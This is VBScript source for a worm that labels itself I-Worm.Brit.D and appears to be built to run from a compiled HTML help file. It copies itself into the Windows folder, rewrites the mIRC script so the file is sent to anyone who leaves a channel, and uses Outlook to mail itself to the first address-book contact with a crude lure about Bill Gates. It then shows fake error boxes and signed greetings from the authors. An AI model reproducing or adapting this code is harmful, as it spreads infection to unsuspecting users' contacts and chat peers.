
on error resume next
	myPath=Replace(location.href,"mk:@MSITStore:","")
	myPath=Replace(myPath,"/","\")
	myPath=Mid(myPath,1,Instr(myPath,"::")-1)
For i = 1 To 3

If i = 1 Then Drive = "c"
If i = 2 Then Drive = "D"
If i = 3 Then Drive = "E"

    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.GetFolder(Drive & ":\")
    Set sf = f.SubFolders
    For Each f1 In sf

                        If fso.fileExists(f1 & "\MIRC.INI") Then mIRCDir = f1 & "\MIRC.INI"
                        Set G = fso.GetFolder(f1)
                        Set Y = G.SubFolders
                        For Each D1 In Y

                                If fso.fileExists(D1 & "\MIRC.INI") Then mIRCDir = D1 & "\MIRC.INI"
                                Set P = fso.GetFolder(D1)
                                Set W = P.SubFolders
                                For Each E1 In W

    If fso.fileExists(E1 & "\MIRC.INI") Then mIRCDir = E1 & "\MIRC.INI"
    Set Q = fso.GetFolder(E1)
    Set J = Q.SubFolders
    For Each T1 In J

    Next: Next: Next: Next: Next

	Set WinDir = fso.GetSpecialFolder(0)

		fso.CopyFile myPath,WinDir & "\mocosof.chm"

	if mIRCDir = "" then

		Set Shell = CreateObject("WScript.Shell")

			mIRCDir = Shell.Regread("HKEY_LOCAL_MACHINE\SOFTWARE\CLASSES\ChatFile\DefaultIcon\")

                   		if Instr(Ucase(mIRCDir),"MIRC32.EXE") > 0 then
                    			mIRCDir = mIRCDir
                    		Else
                    			mIRCDir = ""
                    		End if

		Set Shell = Nothing

	end if

	if mIRCDir <> "" then

		mIRCDir = Mid(mIRCDir, 1, InStrRev(mIRCDir, "\"))
		mIRCDir = Replace(mIRCDir,"""","")

  	Set fso = CreateObject("Scripting.FileSystemObject")
  	Set f = fso.OpenTextFile(mIRCDir & "Script.ini", 2, True)
  	f.WriteLine "[script]"
	f.Write "n0=on 1:PART:#: if ( $me != $nick ) { /dcc send $nick "&WinDir&"\mocosof.chm }"
  	f.Close
	end if


	Set Shell = CreateObject("WScript.Shell")
		if Shell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\chm") = "" then

	Set Ol = CreateObject("Outlook.Application")

	if Ol.Name = "Outlook" then

	Victim = Ol.GetNamespace("MAPI").AddressLists.Item(1).AddressEntries.GetFirst

	With Ol.CreateItem(olMailItem)
		.Recipients.Add Victim
		.Attachments.Add myPath
		.Subject = "FWD : The life of bill gates"
		.Body = "Bill gates , the president of Mocosoft and the man more fuck in the world"+vbcrlf+"Regards,"+vbcrlf+Ol.Session.CurrentUser.Name
		.Send
	End With
	End IF

	Set Ol = Nothing
		Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\chm","1"
	Set Shell = Nothing
	End if
Msgbox "Error , need the aprobate of Active X"  & vbCrLf & "Need the software Windows 98 for look the video"  & vbCrLf & "Connection to Internet explorer Failure",16,"I-Worm.Brit.D"
Msgbox "�Saludos a nuestros buenos amigos!"  & vbCrLf & "           Hoko and Nemesizz"  & vbCrLf & "    and the friends of Zonavirus " & vbCrLf & "atte: neoDRako And Kuasanagui",15,"I-Worm.Brit.D"
Msgbox "Live Spain and M�xico"  & vbCrLf & "Variant make by"  & vbCrLf & "neoDRako and Kuasanagui",16,"I-Worm.Brit.D"
-->
''#
